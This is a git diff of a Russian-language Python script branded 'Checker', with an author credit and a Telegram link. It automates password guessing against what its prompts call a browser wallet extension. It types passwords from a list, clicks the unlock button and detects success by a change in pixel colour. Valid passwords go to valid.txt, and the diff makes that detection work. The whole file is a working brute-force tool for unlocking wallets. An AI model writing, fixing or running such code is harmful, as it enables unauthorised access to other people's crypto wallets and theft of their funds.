@@ -1,10 +1,12 @@
 import pyautogui as pya
 from pynput import mouse
-from colorama import Fore
-from colorama import Style
+from colorama import Fore, Style, init
+import os.path
 import keyboard as kb
 import re
 import time
+
+init(convert=True)
 
 pos1, pos2, entered, pix = [], [], 0, ''
 
@@ -23,12 +25,17 @@ def get_pos(x, y, btn, pressed):
         entered = 1
 
 print(f'''
-{Fore.RED}███████╗░█████╗░░██████╗██╗░░░██╗  ░█████╗░██╗░░██╗███████╗██╗░░██╗███████╗██████╗░
-██╔════╝██╔══██╗██╔════╝╚██╗░██╔╝  ██╔══██╗██║░░██║██╔════╝██║░██╔╝██╔════╝██╔══██╗
-█████╗░░███████║╚█████╗░░╚████╔╝░  ██║░░╚═╝███████║█████╗░░█████═╝░█████╗░░██████╔╝
-██╔══╝░░██╔══██║░╚═══██╗░░╚██╔╝░░  ██║░░██╗██╔══██║██╔══╝░░██╔═██╗░██╔══╝░░██╔══██╗
-███████╗██║░░██║██████╔╝░░░██║░░░  ╚█████╔╝██║░░██║███████╗██║░╚██╗███████╗██║░░██║
-╚══════╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝{Style.RESET_ALL}''')
+{Fore.RED}  ░█████╗░██╗░░██╗███████╗██╗░░██╗███████╗██████╗░
+  ██╔══██╗██║░░██║██╔════╝██║░██╔╝██╔════╝██╔══██╗
+  ██║░░╚═╝███████║█████╗░░█████═╝░█████╗░░██████╔╝
+  ██║░░██╗██╔══██║██╔══╝░░██╔═██╗░██╔══╝░░██╔══██╗
+  ╚█████╔╝██║░░██║███████╗██║░╚██╗███████╗██║░░██║
+  ░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝{Style.RESET_ALL}
+                    {Fore.GREEN}by Knafi {Style.RESET_ALL}
+                    {Fore.GREEN}Telegram: https://t.me/lookupinfo {Style.RESET_ALL}
+
+                    
+                    ''')
 
 file_name = input('Переместите файл в папку со скриптом, напишите сюда его название и нажмите Enter:::')
 
@@ -46,6 +53,20 @@ input('Наведите курсор на поле кнопку ввода и к
 print(f'[+] Координаты кнопки: {pos2[0], pos2[1], pix}')
 
 listener.stop()
+
+valid_file = os.path.isfile('valid.txt')
+if valid_file is False: 
+    with open("valid.txt", "w", encoding="utf-8") as v:
+        v.write("""
+  ░█████╗░██╗░░██╗███████╗██╗░░██╗███████╗██████╗░
+  ██╔══██╗██║░░██║██╔════╝██║░██╔╝██╔════╝██╔══██╗
+  ██║░░╚═╝███████║█████╗░░█████═╝░█████╗░░██████╔╝
+  ██║░░██╗██╔══██║██╔══╝░░██╔═██╗░██╔══╝░░██╔══██╗
+  ╚█████╔╝██║░░██║███████╗██║░╚██╗███████╗██║░░██║
+  ░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
+                    by Knafi 
+                    Telegram: https://t.me/lookupinfo
+        """)
 
 print('[=============]')
 print('[+] У вас есть 5 секунд, что бы открыть расширение и сменить язык на английский')
@@ -79,23 +100,25 @@ if len(file_name) > 0:
                             pya.moveTo(pos1[0], pos1[1])
                             pya.click()
                             time.sleep(.5)
-                            is_pix = pya.pixelMatchesColor(pos1[0], pos1[0], (pix[0], pix[0], pix[0]))
-                            if is_pix is True: 
+                            is_pix = pya.pixel(pos2[0], pos2[1])
+                            if is_pix[0] != pix[0] or is_pix[1] != pix[1] or is_pix[2] != pix[2]: 
                                 print(f'{Fore.GREEN}[+] Valid. Пароль {x} валиден{Style.RESET_ALL}')
                                 print(f'{Fore.YELLOW}[+] Записываю валид в файл{Style.RESET_ALL}')
                                 try:
                                     with open ('valid.txt', 'a') as v:
-                                        v.write(f'[+] Valid: {x}')
+                                        v.write(f'\n[+] Valid: {x}')
                                         print(f'{Fore.GREEN}[+] Изменения успешно записаны в файл{Style.RESET_ALL}')
                                 except:
                                     print(f'{Fore.RED}[-] Ошибка при записи файла{Style.RESET_ALL}')
+                                print(f'{Fore.RED}У вас есть 5 секунд, что бы закрыть кошелек.{Style.RESET_ALL}')
+                                time.sleep(5)
                             else:
                                 kb.press('ctrl+a')
                                 kb.release('ctrl+a')
                                 kb.press('backspace')
                                 print('[+] Кнопка нажата. Перезапуск цикла')
                 else:
-                    print('{Fore.RED}[-] Произошла ошибка. Не удалось извлечь значения.{Style.RESET_ALL}')
+                    print(f'{Fore.RED}[-] Произошла ошибка. Не удалось извлечь значения.{Style.RESET_ALL}')
                 #print(arr) 
             else:
                 print('{Fore.RED}[-] Файл пуст{Style.RESET_ALL}')
